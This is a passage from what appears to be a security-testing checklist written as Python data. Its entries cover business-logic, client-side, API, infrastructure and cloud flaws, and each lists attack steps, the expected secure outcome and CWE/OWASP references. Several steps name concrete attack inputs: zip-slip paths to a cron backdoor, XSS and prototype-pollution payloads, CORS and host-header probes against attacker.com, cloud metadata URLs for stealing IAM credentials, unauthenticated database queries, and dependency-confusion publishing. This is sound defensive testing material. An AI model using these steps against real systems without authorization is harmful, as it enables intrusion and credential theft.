        "category": "File Upload", "severity": "high",
        "description": "Archives containing path traversal filenames extract files outside the intended directory.",
        "attack_pattern": "Create a zip with files named with traversal paths and upload it.",
        "steps": [
            "Create malicious zip: evilenough.zip containing ../../shell.jsp",
            "Use: zip-slip tool or Python: zipfile.ZipFile, add file with path '../../etc/cron.d/backdoor'",
            "Upload to any feature that extracts archives (import, restore, plugin upload)",
            "Verify if files are extracted outside the target directory",
        ],
        "expected_result": "Zip extraction must validate all entry paths against the target directory before writing.",
        "cwe": "CWE-22", "owasp": "A01:2021",
        "tools": {}, "applicable_to": ["web"], "tags": ["upload", "zipslip", "path-traversal"],
    },

    # ── BUSINESS LOGIC ────────────────────────────────────────────────────────
    {
        "id": "TC-BL001", "title": "Race Condition / TOCTOU",
        "category": "Business Logic", "severity": "high",
        "description": "Concurrent requests can bypass single-use restrictions, double-spend credits, or apply promo codes multiple times.",
        "attack_pattern": "Send multiple identical requests simultaneously to exploit check-then-act gaps.",
        "steps": [
            "Identify single-use operations: coupon codes, referral bonuses, gift card redemption",
            "Send 50 simultaneous requests using Burp Turbo Intruder or asyncio",
            "Check if operation succeeded more than once (credit applied multiple times, coupon reused)",
            "Test account creation race: register same email simultaneously — can two accounts be created?",
            "Test balance transfer: subtract and add simultaneously to get extra balance",
        ],
        "expected_result": "All single-use operations must use database-level locks or atomic transactions.",
        "cwe": "CWE-367", "owasp": "A04:2021",
        "tools": {}, "applicable_to": ["web", "api"], "tags": ["race-condition", "logic", "business-logic"],
    },
    {
        "id": "TC-BL002", "title": "Price / Parameter Manipulation",
        "category": "Business Logic", "severity": "high",
        "description": "Client-side price parameters sent during checkout can be modified to purchase items for $0 or negative amounts.",
        "attack_pattern": "Intercept and modify price, quantity, and discount parameters in purchase flows.",
        "steps": [
            "Intercept checkout request — look for price, amount, total in request body",
            "Modify price to 0 or negative value: {\"price\": 0.01} or {\"amount\": -100}",
            "Test quantity: negative quantity + apply discount = negative total (credit)",
            "Test integer overflow: quantity=99999999 * price — check for integer overflow",
            "Test discount beyond 100%: coupon=100OFF",
        ],
        "expected_result": "Prices and totals must always be calculated server-side from the product catalog.",
        "cwe": "CWE-20", "owasp": "A04:2021",
        "tools": {}, "applicable_to": ["web", "api"], "tags": ["logic", "payment", "business-logic"],
    },
    {
        "id": "TC-BL003", "title": "Workflow Bypass",
        "category": "Business Logic", "severity": "medium",
        "description": "Multi-step processes (checkout, registration, verification) can often be bypassed by skipping steps.",
        "attack_pattern": "Navigate directly to later steps in a multi-step flow, skipping required steps.",
        "steps": [
            "Map the complete workflow (step 1 → 2 → 3 → confirmation)",
            "After completing step 1, jump directly to step 3 URL",
            "Submit step 3 parameters without completing step 2",
            "Test email verification bypass: navigate directly to authenticated area before verifying",
            "Test payment bypass: jump from cart directly to order confirmation endpoint",
        ],
        "expected_result": "Server must validate all previous steps are completed before processing the next.",
        "cwe": "CWE-284", "owasp": "A04:2021",
        "tools": {}, "applicable_to": ["web"], "tags": ["logic", "workflow", "bypass"],
    },
    {
        "id": "TC-BL004", "title": "Account Takeover via Logic Flaws",
        "category": "Business Logic", "severity": "critical",
        "description": "Common ATO patterns from bug bounty reports: password reset token reuse, self-XSS chain, OAuth linking, and IDOR on account settings.",
        "attack_pattern": "Chain logic flaws to hijack another user's account.",
        "steps": [
            "Test password reset token reuse: use same token twice",
            "Test token validity: modify email in reset link, does original token work for new address?",
            "OAuth account linking: can attacker-controlled OAuth account be linked to victim account?",
            "IDOR on email change: change email of user ID other than self",
            "Test: change password without knowing old password via API (skip old_password field)",
        ],
        "expected_result": "Single-use tokens. Server-side email ownership verification. No IDOR on account settings.",
        "cwe": "CWE-640", "owasp": "A07:2021",
        "tools": {}, "applicable_to": ["web", "api"], "tags": ["ato", "account-takeover", "critical"],
    },

    # ── CLIENT-SIDE ───────────────────────────────────────────────────────────
    {
        "id": "TC-CS001", "title": "DOM-Based XSS",
        "category": "Client-Side", "severity": "high",
        "description": "JavaScript reads from dangerous sources (location.hash, document.referrer) and writes to sinks (innerHTML, eval) without sanitization.",
        "attack_pattern": "Inject payloads into DOM sources that flow to sinks without server involvement.",
        "steps": [
            "Identify DOM sources: location.hash, location.search, document.referrer, localStorage",
            "Identify DOM sinks: innerHTML, document.write, eval, setTimeout, location.href",
            "Test: https://target.com/page#<img src=x onerror=alert(1)>",
            "Test: https://target.com/page?q=<svg onload=alert(1)>",
            "Use DOM Invader (Burp) to automatically trace sources to sinks",
        ],
        "expected_result": "Use textContent instead of innerHTML. Sanitize all DOM writes. Implement CSP.",
        "cwe": "CWE-79", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["xss", "dom"]},
        "applicable_to": ["web"], "tags": ["xss", "dom", "client-side"],
    },
    {
        "id": "TC-CS002", "title": "Clickjacking",
        "category": "Client-Side", "severity": "medium",
        "description": "Pages loaded in iframes allow click-hijacking attacks that trick users into unintended actions.",
        "attack_pattern": "Embed target in an iframe and overlay invisible buttons.",
        "steps": [
            "Create test HTML: <iframe src='https://target.com/account/delete' style='opacity:0.5'></iframe>",
            "Check if the page loads inside the iframe (no X-Frame-Options or CSP frame-ancestors)",
            "Test all sensitive pages: account settings, password change, delete account, transfer funds",
            "Craft PoC overlay with decoy UI aligned to critical buttons",
        ],
        "expected_result": "All pages must set X-Frame-Options: DENY or CSP frame-ancestors 'none'.",
        "cwe": "CWE-1021", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["clickjacking", "headers"]},
        "applicable_to": ["web"], "tags": ["clickjacking", "client-side"],
    },
    {
        "id": "TC-CS003", "title": "CORS Misconfiguration",
        "category": "Client-Side", "severity": "high",
        "description": "Overly permissive CORS allows attacker-controlled sites to make credentialed cross-origin requests.",
        "attack_pattern": "Test CORS headers with various Origin values and check for credentialed access.",
        "steps": [
            "Send request with: Origin: https://attacker.com — check for Access-Control-Allow-Origin: https://attacker.com",
            "Test null origin: Origin: null — some configs reflect null allowing file:// sandboxed iframes",
            "Test subdomain: Origin: https://evil.target.com — check if reflected",
            "Test with credentials: ensure Access-Control-Allow-Credentials: true requires explicit origin (not *)",
            "Exploit: craft page on attacker.com that fetches /api/user/profile with credentials",
        ],
        "expected_result": "CORS must use explicit allowlist. Never reflect arbitrary Origin. Credentials require exact origins.",
        "cwe": "CWE-942", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["cors", "misconfig"]},
        "applicable_to": ["web", "api"], "tags": ["cors", "client-side"],
    },
    {
        "id": "TC-CS004", "title": "WebSocket Security",
        "category": "Client-Side", "severity": "medium",
        "description": "WebSockets bypass many security controls — no same-origin policy, no CSRF tokens by default, messages not validated server-side.",
        "attack_pattern": "Intercept and manipulate WebSocket messages and test for origin validation.",
        "steps": [
            "Intercept WebSocket handshake — check if Origin header is validated",
            "Connect from a different origin: new WebSocket('wss://target.com/ws') from attacker domain",
            "Intercept and manipulate messages in Burp — inject malicious commands",
            "Test for XSS via WebSocket: send payload as message and check if reflected in DOM",
            "Test authentication: does WS connection remain active after token expiry/logout?",
        ],
        "expected_result": "WebSocket server must validate Origin header and authenticate connections.",
        "cwe": "CWE-345", "owasp": "A05:2021",
        "tools": {}, "applicable_to": ["web"], "tags": ["websocket", "client-side"],
    },
    {
        "id": "TC-CS005", "title": "Web Cache Poisoning",
        "category": "Client-Side", "severity": "high",
        "description": "Injecting malicious content into a cached response causes it to be served to all subsequent users requesting the same URL.",
        "attack_pattern": "Use unkeyed inputs (headers, parameters) to poison the cache with malicious responses.",
        "steps": [
            "Identify caching layer (CDN, Varnish, nginx cache) via Age, X-Cache, CF-Cache-Status headers",
            "Find unkeyed inputs: X-Forwarded-Host, X-Original-URL, X-Rewrite-URL headers",
            "Test: add X-Forwarded-Host: attacker.com — if reflected in response, cache it",
            "Poison: inject XSS payload in a header that's reflected in script src or link href",
            "Verify: request without the poisoning header — check if cached malicious response is returned",
        ],
        "expected_result": "Cache keys must include all inputs that affect the response. Unkeyed inputs must be stripped.",
        "cwe": "CWE-444", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["cache"]},
        "applicable_to": ["web"], "tags": ["cache-poisoning", "advanced"],
    },
    {
        "id": "TC-CS006", "title": "Prototype Pollution",
        "category": "Client-Side", "severity": "high",
        "description": "JavaScript prototype chain manipulation allows injecting properties into all objects, enabling XSS and logic bypass.",
        "attack_pattern": "Inject __proto__ or constructor.prototype via URL params, JSON, or DOM-based sources.",
        "steps": [
            "Test URL: https://target.com/?__proto__[test]=injected — check if window.test === 'injected'",
            "Test JSON body: {\"__proto__\": {\"isAdmin\": true}}",
            "Test nested: {\"constructor\": {\"prototype\": {\"isAdmin\": true}}}",
            "Look for sinks: lodash.merge(), _.defaultsDeep(), Object.assign() with user input",
            "Escalate to XSS: pollute a property used in innerHTML: {\"__proto__\": {\"innerHTML\": \"<img onerror=alert(1)>\"}}",
        ],
        "expected_result": "Use Object.create(null) for untrusted data. Validate object keys. Use safe merge functions.",
        "cwe": "CWE-1321", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["prototype-pollution"]},
        "applicable_to": ["web"], "tags": ["prototype-pollution", "javascript", "advanced"],
    },

    # ── API SECURITY ──────────────────────────────────────────────────────────
    {
        "id": "TC-API001", "title": "Broken Object Level Authorization (BOLA)",
        "category": "API Security", "severity": "critical",
        "description": "APIs using object IDs without ownership verification allow any user to access any object.",
        "attack_pattern": "Replace object IDs with IDs belonging to other users/orgs.",
        "steps": [
            "Map all API endpoints using object IDs: GET /api/users/{id}, GET /api/orders/{id}",
            "With account B's token, request account A's resources by ID",
            "Test all HTTP methods: GET, PUT, PATCH, DELETE on cross-user resources",
            "Test horizontal (same role) and vertical (cross-role) privilege escalation",
        ],
        "expected_result": "Every object access must verify requesting user owns or has permission.",
        "cwe": "CWE-639", "owasp": "A01:2021",
        "tools": {}, "applicable_to": ["api"], "tags": ["bola", "idor", "api"],
    },
    {
        "id": "TC-API002", "title": "API Rate Limiting Bypass",
        "category": "API Security", "severity": "medium",
        "description": "APIs without effective rate limiting are vulnerable to brute-force. Rate limits are often bypassable.",
        "attack_pattern": "Probe for thresholds then attempt bypass techniques.",
        "steps": [
            "Identify rate-limited endpoints (login, OTP, expensive queries)",
            "Test IP bypass: X-Forwarded-For, X-Real-IP, CF-Connecting-IP with different values",
            "Test path variation: /api/login vs /api/Login vs /api/login/",
            "Test account-level bypass: multiple API keys for the same action",
        ],
        "expected_result": "Rate limits enforced server-side regardless of IP headers.",
        "cwe": "CWE-770", "owasp": "A04:2021",
        "tools": {"nuclei_tags": ["rate-limit"]},
        "applicable_to": ["api", "web"], "tags": ["rate-limit", "brute-force"],
    },
    {
        "id": "TC-API003", "title": "GraphQL Introspection & Batching",
        "category": "API Security", "severity": "medium",
        "description": "Enabled introspection exposes full schema. Batching allows abuse of rate limits and brute-force.",
        "attack_pattern": "Send introspection query and batch mutation requests.",
        "steps": [
            "Send: {__schema{types{name,fields{name}}}} — check if schema returned",
            "Use graphql-voyager to visualize schema and find sensitive mutations",
            "Test batching: send array of 100 login mutations in single request",
            "Look for deleteUser, updateRole, createAdmin, disableMFA mutations",
            "Test field-level authorization: request admin-only fields as regular user",
        ],
        "expected_result": "Introspection disabled in production. Batching rate-limited. Field-level auth enforced.",
        "cwe": "CWE-200", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["graphql", "exposure"]},
        "applicable_to": ["api"], "tags": ["graphql", "api"],
    },
    {
        "id": "TC-API004", "title": "Mass Assignment",
        "category": "API Security", "severity": "high",
        "description": "APIs binding request body to models allow setting privileged fields (role, isAdmin) not meant for user input.",
        "attack_pattern": "Include undocumented privileged fields in API request bodies.",
        "steps": [
            "Discover model fields from API responses, docs, or JavaScript source",
            "Add to update requests: {\"role\": \"admin\", \"is_verified\": true, \"balance\": 9999}",
            "Test registration: {\"email\": \"x\", \"password\": \"y\", \"is_admin\": true}",
            "Test all PUT/PATCH endpoints for unfiltered binding",
        ],
        "expected_result": "Use explicit allow-lists (DTOs/serializers). Never bind raw request data to models.",
        "cwe": "CWE-915", "owasp": "A03:2021",
        "tools": {}, "applicable_to": ["api"], "tags": ["mass-assignment", "api"],
    },
    {
        "id": "TC-API005", "title": "Excessive Data Exposure",
        "category": "API Security", "severity": "medium",
        "description": "APIs returning full object data and relying on client-side filtering expose sensitive fields.",
        "attack_pattern": "Inspect all API responses for fields not displayed in the UI.",
        "steps": [
            "Compare raw API response with what the UI actually displays",
            "Look for hidden fields: password_hash, ssn, credit_card, internal_notes, admin_flag",
            "Test user list endpoint: does it return all users' private details?",
            "Test search endpoint: does partial match return more data than needed?",
            "Intercept mobile app traffic — mobile APIs often expose more than web APIs",
        ],
        "expected_result": "API responses must only include fields necessary for the client's function.",
        "cwe": "CWE-200", "owasp": "A03:2021",
        "tools": {}, "applicable_to": ["api"], "tags": ["api", "data-exposure"],
    },
    {
        "id": "TC-API006", "title": "Broken Function Level Authorization",
        "category": "API Security", "severity": "high",
        "description": "Admin functions accessible to regular users by guessing or manipulating endpoint paths.",
        "attack_pattern": "Test admin/privileged API endpoints while authenticated as a regular user.",
        "steps": [
            "Identify admin endpoints from JS source, docs, or swagger: /api/admin/*, /api/v1/admin/*",
            "Access admin endpoints with regular user token",
            "Test HTTP method switching: GET /api/users works, try DELETE /api/users/all",
            "Test API version switching: v2 admin endpoints accessible from v1 paths",
            "Test undocumented endpoints: /api/internal/*, /api/debug/*",
        ],
        "expected_result": "All privileged functions must verify user role before execution.",
        "cwe": "CWE-285", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["exposure", "api"]},
        "applicable_to": ["api"], "tags": ["authorization", "api", "privilege-escalation"],
    },

    # ── INFRASTRUCTURE ────────────────────────────────────────────────────────
    {
        "id": "TC-N001", "title": "SSL/TLS Misconfiguration",
        "category": "Infrastructure", "severity": "medium",
        "description": "Weak TLS configurations allow downgrade attacks. Expired certificates indicate poor lifecycle management.",
        "attack_pattern": "Probe TLS configuration with specialized scanners.",
        "steps": [
            "Run: testssl.sh <target> or sslyze --regular <target>",
            "Check for SSLv2, SSLv3, TLS 1.0, TLS 1.1 (must be disabled)",
            "Check for RC4, DES, 3DES, EXPORT, NULL ciphers",
            "Verify certificate: expiry, CN match, trusted CA, 2048-bit+ key",
            "Check HSTS: Strict-Transport-Security: max-age=31536000; includeSubDomains",
        ],
        "expected_result": "TLS 1.2+ only. Strong ciphers. Valid certificate chain. HSTS preloaded.",
        "cwe": "CWE-326", "owasp": "A02:2021",
        "tools": {"nmap": ["--script ssl-enum-ciphers", "-p 443"], "nuclei_tags": ["ssl", "tls"]},
        "applicable_to": ["web", "network", "api"], "tags": ["tls", "ssl", "certificate"],
    },
    {
        "id": "TC-N002", "title": "Exposed Admin Panels",
        "category": "Infrastructure", "severity": "high",
        "description": "Internet-accessible admin panels without IP restriction increase attack surface significantly.",
        "attack_pattern": "Enumerate common admin paths across all discovered hosts.",
        "steps": [
            "Fuzz: /admin, /administrator, /wp-admin, /phpmyadmin, /manager, /console",
            "Test: /jenkins, /grafana, /kibana, /portainer, /traefik, /rabbitmq",
            "Check all subdomains: admin.target.com, manage.target.com, dashboard.target.com",
            "Verify accessibility without IP restriction",
            "Test default credentials on all discovered panels",
        ],
        "expected_result": "Admin panels IP-restricted to management networks or VPN-only.",
        "cwe": "CWE-284", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["panel", "exposure", "login"], "ffuf_wordlist": "common.txt"},
        "applicable_to": ["web", "network"], "tags": ["admin-panel", "exposure"],
    },
    {
        "id": "TC-N003", "title": "Exposed Metrics & Debug Endpoints",
        "category": "Infrastructure", "severity": "high",
        "description": "Prometheus /metrics, Spring Actuator, /debug, /pprof expose internal app data and sometimes allow code execution.",
        "attack_pattern": "Request common metrics and debug paths without authentication.",
        "steps": [
            "Test: /metrics, /actuator, /actuator/env, /actuator/heapdump, /actuator/shutdown",
            "Test: /debug/pprof, /debug/vars, /__debug/",
            "Test: /swagger.json, /openapi.json, /api-docs, /v2/api-docs",
            "Spring Actuator /actuator/env may expose plaintext passwords",
            "/actuator/shutdown can kill the application",
        ],
        "expected_result": "All debug/metrics endpoints must be disabled or restricted to internal networks.",
        "cwe": "CWE-200", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["exposure", "misconfig", "spring"]},
        "applicable_to": ["web", "network"], "tags": ["debug", "metrics", "exposure"],
    },
    {
        "id": "TC-N004", "title": "Unencrypted Service Exposure",
        "category": "Infrastructure", "severity": "high",
        "description": "Plaintext protocols (Telnet, FTP, HTTP) transmit credentials in cleartext.",
        "attack_pattern": "Port scan for plaintext services and verify accessibility.",
        "steps": [
            "Scan: nmap -sV -p 21,23,25,80,110,143 <target>",
            "Test anonymous FTP: ftp <target>, user: anonymous",
            "Test Telnet: telnet <target> 23",
            "Check HTTP → HTTPS redirect on port 80",
        ],
        "expected_result": "All plaintext services disabled or replaced with encrypted equivalents.",
        "cwe": "CWE-319", "owasp": "A02:2021",
        "tools": {"nmap": ["-sV", "-p 21,23,25,80,110,143"]},
        "applicable_to": ["network"], "tags": ["plaintext", "ftp", "telnet"],
    },
    {
        "id": "TC-N005", "title": "Backup & Config File Discovery",
        "category": "Infrastructure", "severity": "high",
        "description": "Backup files (.bak, .old, ~) accessible in web root expose source code and configuration.",
        "attack_pattern": "Fuzz for backup extensions across known application paths.",
        "steps": [
            "For each endpoint /index.php: test /index.php.bak, /index.php.old, /index.php~",
            "Test: /backup.zip, /site.tar.gz, /db.sql.gz",
            "Test config backups: /config.php.bak, /web.config.bak, /.htaccess.bak",
            "Use ffuf -w backup-ext-list.txt against all discovered paths",
        ],
        "expected_result": "Backup files must not be in web-accessible directories.",
        "cwe": "CWE-530", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["exposure", "backup"]},
        "applicable_to": ["web"], "tags": ["backup", "exposure"],
    },
    {
        "id": "TC-N006", "title": "Database Port Directly Exposed",
        "category": "Infrastructure", "severity": "critical",
        "description": "Databases listening on public IPs allow direct exploitation, credential brute-force, and data extraction.",
        "attack_pattern": "Port scan for common database ports on all discovered IPs.",
        "steps": [
            "nmap -sV -p 3306,5432,27017,6379,9200,5984,8086,1521 <all_ips>",
            "MySQL: mysql -u root -h <ip> (no password)",
            "MongoDB: mongo --host <ip> (no auth) — db.getCollectionNames()",
            "Redis: redis-cli -h <ip> INFO server",
            "Elasticsearch: curl http://<ip>:9200/_cat/indices",
        ],
        "expected_result": "Database ports must be firewalled. Never exposed to internet.",
        "cwe": "CWE-284", "owasp": "A05:2021",
        "tools": {"nmap": ["-sV", "-p 3306,5432,27017,6379,9200"], "nuclei_tags": ["database", "exposure"]},
        "applicable_to": ["network", "cloud"], "tags": ["database", "exposure", "critical"],
    },
    {
        "id": "TC-N007", "title": "Kubernetes Dashboard Exposure",
        "category": "Infrastructure", "severity": "critical",
        "description": "Publicly accessible Kubernetes dashboards allow full cluster takeover.",
        "attack_pattern": "Scan for Kubernetes dashboard and API server on common ports.",
        "steps": [
            "Scan: nmap -p 8001,8443,6443,10250,10255,2379 <target_range>",
            "Test K8s API: curl https://<ip>:6443/api/v1/pods --insecure",
            "Test dashboard: https://<ip>:8001/api/v1/namespaces/kubernetes-dashboard/services",
            "Test kubelet: curl http://<ip>:10255/pods (unauthenticated read)",
            "Test etcd: curl http://<ip>:2379/v2/keys/?recursive=true",
        ],
        "expected_result": "K8s API and dashboard must require authentication. etcd encrypted at rest and in transit.",
        "cwe": "CWE-284", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["kubernetes", "exposure"]},
        "applicable_to": ["network", "cloud"], "tags": ["kubernetes", "cloud", "critical"],
    },
    {
        "id": "TC-N008", "title": "HTTP Methods (TRACE/PUT/DELETE)",
        "category": "Infrastructure", "severity": "medium",
        "description": "Dangerous HTTP methods like TRACE (XST), PUT (file write), and DELETE expose significant risk.",
        "attack_pattern": "Test all HTTP methods on all discovered endpoints.",
        "steps": [
            "OPTIONS request to identify allowed methods",
            "TRACE request — if 200 with request echoed back: Cross-Site Tracing (XST) possible",
            "PUT /test.txt with body — if successful: arbitrary file write",
            "DELETE /important-file — test for unauthenticated file deletion",
            "Test method override: X-HTTP-Method-Override: DELETE on POST requests",
        ],
        "expected_result": "Only GET/POST/PUT/PATCH/DELETE required by the app should be allowed. TRACE disabled.",
        "cwe": "CWE-650", "owasp": "A05:2021",
        "tools": {"nmap": ["--script http-methods", "-p 80,443"]},
        "applicable_to": ["web", "network"], "tags": ["http-methods", "configuration"],
    },

    # ── CLOUD SECURITY ────────────────────────────────────────────────────────
    {
        "id": "TC-C001", "title": "S3 Bucket Public Access",
        "category": "Cloud Security", "severity": "critical",
        "description": "Misconfigured S3 buckets expose sensitive data or allow hosting malicious content.",
        "attack_pattern": "Enumerate probable bucket names and test for public list and object access.",
        "steps": [
            "Enumerate: <target>, <target>-prod, <target>-backup, <target>-dev, <target>-static",
            "List: aws s3 ls s3://<bucket> --no-sign-request",
            "Read: aws s3 cp s3://<bucket>/config.json . --no-sign-request",
            "Write: aws s3 cp test.txt s3://<bucket>/ --no-sign-request",
            "Check for: .env, credentials, database dumps, PII",
        ],
        "expected_result": "Block Public Access enabled. Least-privilege bucket policies.",
        "cwe": "CWE-284", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["s3", "cloud", "exposure"]},
        "applicable_to": ["cloud"], "tags": ["s3", "aws", "data-exposure", "critical"],
    },
    {
        "id": "TC-C002", "title": "Cloud Metadata SSRF (IMDS)",
        "category": "Cloud Security", "severity": "critical",
        "description": "IMDS access via SSRF yields temporary IAM credentials granting cloud account access.",
        "attack_pattern": "Exploit SSRF to reach the IMDS endpoint.",
        "steps": [
            "Find SSRF vector (see TC-W004)",
            "AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>",
            "GCP: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "Azure: http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01",
            "Use extracted credentials: aws sts get-caller-identity --access-key <key>",
        ],
        "expected_result": "IMDSv2 (token-required) enforced. SSRF protection blocks RFC 1918.",
        "cwe": "CWE-918", "owasp": "A10:2021",
        "tools": {"nuclei_tags": ["ssrf", "cloud", "aws"]},
        "applicable_to": ["cloud", "web"], "tags": ["ssrf", "imds", "aws", "critical"],
    },
    {
        "id": "TC-C003", "title": "Azure Blob / GCS Public Storage",
        "category": "Cloud Security", "severity": "high",
        "description": "Public Azure Blob containers and GCS buckets expose sensitive data without authentication.",
        "attack_pattern": "Enumerate storage account names and test for public access.",
        "steps": [
            "Azure: https://<account>.blob.core.windows.net/<container>?restype=container&comp=list",
            "GCS: https://storage.googleapis.com/<bucket>/",
            "Try: <company>-prod, <company>backup, <company>static",
            "Check for sensitive files in accessible buckets",
        ],
        "expected_result": "All cloud storage uses private access. Public access explicitly justified.",
        "cwe": "CWE-284", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["cloud", "azure", "gcs"]},
        "applicable_to": ["cloud"], "tags": ["cloud", "azure", "gcs", "storage"],
    },
    {
        "id": "TC-C004", "title": "IAM Privilege Escalation",
        "category": "Cloud Security", "severity": "critical",
        "description": "Overly permissive IAM policies allow attackers with limited access to escalate to admin.",
        "attack_pattern": "Enumerate IAM permissions and identify escalation paths.",
        "steps": [
            "Enumerate current permissions: aws iam get-user, aws iam list-attached-user-policies",
            "Check for iam:CreatePolicyVersion, iam:SetDefaultPolicyVersion, iam:AttachUserPolicy",
            "Check for sts:AssumeRole with overly permissive trust policy",
            "Test lambda:UpdateFunctionCode / PassRole to escalate via Lambda",
            "Use Pacu or Cloudsploit for automated IAM privilege escalation enumeration",
        ],
        "expected_result": "Least privilege IAM policies. No wildcard * permissions. SCPs enforced.",
        "cwe": "CWE-269", "owasp": "A01:2021",
        "tools": {"nuclei_tags": ["cloud", "iam"]},
        "applicable_to": ["cloud"], "tags": ["iam", "privilege-escalation", "aws", "critical"],
    },

    # ── INFORMATION DISCLOSURE ────────────────────────────────────────────────
    {
        "id": "TC-I001", "title": "Verbose Error Messages",
        "category": "Information Disclosure", "severity": "low",
        "description": "Stack traces and debug pages expose internal paths, library versions, and DB schema.",
        "attack_pattern": "Trigger errors with malformed input and inspect response for verbose details.",
        "steps": [
            "Submit unexpected types: strings for numeric fields, very long inputs, null bytes",
            "Request non-existent resources: /test.aspx, /test.php, /test.jsp",
            "Trigger DB errors with single quote in all params",
            "Submit malformed JSON/XML to API endpoints",
            "Check for Django DEBUG=True, PHP error_reporting, Rails exception page",
        ],
        "expected_result": "Generic error messages only in production. No stack traces to client.",
        "cwe": "CWE-209", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["exposure", "error-page"]},
        "applicable_to": ["web", "api"], "tags": ["information-disclosure"],
    },
    {
        "id": "TC-I002", "title": "Security Header Audit",
        "category": "Information Disclosure", "severity": "medium",
        "description": "Missing security headers leave browsers vulnerable to clickjacking, MIME sniffing, and XSS.",
        "attack_pattern": "Inspect HTTP response headers against security checklist.",
        "steps": [
            "Check Content-Security-Policy — controls script/style/image sources",
            "Check X-Frame-Options: DENY or CSP frame-ancestors — clickjacking protection",
            "Check X-Content-Type-Options: nosniff — prevents MIME sniffing",
            "Check Strict-Transport-Security with adequate max-age",
            "Check Server and X-Powered-By — strip version info",
        ],
        "expected_result": "All security headers present. Server/X-Powered-By stripped or generic.",
        "cwe": "CWE-693", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["headers", "misconfig"]},
        "applicable_to": ["web", "api"], "tags": ["headers", "configuration"],
    },
    {
        "id": "TC-I003", "title": "API Version & Swagger Exposure",
        "category": "Information Disclosure", "severity": "info",
        "description": "Undocumented/deprecated API versions and exposed Swagger docs reveal the full attack surface.",
        "attack_pattern": "Enumerate API versions and find exposed documentation endpoints.",
        "steps": [
            "Test: /api/v1/, /api/v2/, /api/v3/, /api/beta/, /api/internal/",
            "Test docs: /swagger.json, /openapi.json, /api-docs, /v2/api-docs, /swagger-ui.html",
            "Compare v1 vs v2 — older versions often have fewer security controls",
            "Extract endpoints from JS source: grep for 'fetch\\|axios\\|API_URL' in bundles",
        ],
        "expected_result": "Deprecated API versions decommissioned. Internal APIs require authentication.",
        "cwe": "CWE-200", "owasp": "A01:2021",
        "tools": {"nuclei_tags": ["exposure", "api", "swagger"]},
        "applicable_to": ["api", "web"], "tags": ["api", "enumeration"],
    },

    # ── MODERN WEB ATTACKS (from bug bounty patterns) ─────────────────────────
    {
        "id": "TC-MW001", "title": "Web Cache Deception",
        "category": "Modern Web Attacks", "severity": "high",
        "description": "Cache servers cache authenticated responses for static-looking paths, exposing victim data to attackers.",
        "attack_pattern": "Craft URLs that trick the cache into storing authenticated responses.",
        "steps": [
            "Identify authenticated endpoints returning personal data: /account, /profile",
            "Append fake static suffix: /account/nonexistent.css, /profile/fake.jpg",
            "If cached (via Age or X-Cache headers), visit URL as unauthenticated user",
            "Check if cached authenticated response is returned to unauthenticated attacker",
            "Test variations: /account;.css, /account/.css, /account%2F..%2Fstatic.css",
        ],
        "expected_result": "Cache must not store authenticated responses. Use Cache-Control: no-store on user-specific endpoints.",
        "cwe": "CWE-525", "owasp": "A05:2021",
        "tools": {}, "applicable_to": ["web"], "tags": ["cache-deception", "advanced"],
    },
    {
        "id": "TC-MW002", "title": "Dependency Confusion Attack",
        "category": "Modern Web Attacks", "severity": "high",
        "description": "Private package names published to public registries (npm, PyPI) get installed instead of internal versions.",
        "attack_pattern": "Identify internal package names and publish higher-versioned packages to public registries.",
        "steps": [
            "Find internal package names: package.json, requirements.txt, .npmrc files in public repos",
            "Check if internal package names exist on npm/PyPI/PyPI: npm info <internal-pkg>",
            "Publish to public registry with higher version than internal — 9.9.9",
            "Internal CI/CD systems will install public version — add callback for detection",
            "Monitor for HTTP callbacks from victim infrastructure in DNS logs",
        ],
        "expected_result": "Use scoped packages. Configure package managers to use internal registry exclusively.",
        "cwe": "CWE-829", "owasp": "A08:2021",
        "tools": {}, "applicable_to": ["web", "api", "cloud"], "tags": ["supply-chain", "dependency-confusion"],
    },
    {
        "id": "TC-MW003", "title": "SAML Authentication Bypass",
        "category": "Modern Web Attacks", "severity": "critical",
        "description": "SAML parsing flaws allow signature wrapping, XML comments in NameID, and assertion replay attacks.",
        "attack_pattern": "Manipulate SAML assertion to bypass signature validation.",
        "steps": [
            "Capture a valid SAML response (base64 decode the SAMLResponse parameter)",
            "Test XML signature wrapping: copy signed assertion, add malicious unsigned assertion, wrap original in extensions",
            "Test comment injection in NameID: admin<!----> vs admin (some parsers strip comments)",
            "Test assertion replay: resend same SAMLResponse after it should have expired",
            "Test XXE in SAML XML payload",
        ],
        "expected_result": "Strict schema validation before signature verification. Short assertion lifetime. No XXE.",
        "cwe": "CWE-347", "owasp": "A07:2021",
        "tools": {"nuclei_tags": ["saml", "auth"]},
        "applicable_to": ["web"], "tags": ["saml", "auth", "sso", "critical"],
    },
    {
        "id": "TC-MW004", "title": "Host Header Injection",
        "category": "Modern Web Attacks", "severity": "medium",
        "description": "Applications trusting the Host header for URL generation enable password reset poisoning, cache poisoning, and SSRF.",
        "attack_pattern": "Manipulate Host header and observe if it affects application behavior.",
        "steps": [
            "Add Host: attacker.com and observe if reflected in response or redirects",
            "Test X-Forwarded-Host, X-Host, X-Forwarded-Server as Host override headers",
            "Test password reset: inject attacker host to capture reset tokens (see TC-A004)",
            "Test cache poisoning: if reflected in cached response, poison for all users",
            "Test absolute-URL redirects relying on Host header",
        ],
        "expected_result": "Applications must use a configured base URL. Never trust Host header for sensitive operations.",
        "cwe": "CWE-20", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["host-header", "injection"]},
        "applicable_to": ["web"], "tags": ["host-header", "injection"],
    },

    # ── CRYPTOGRAPHY ──────────────────────────────────────────────────────────
    {
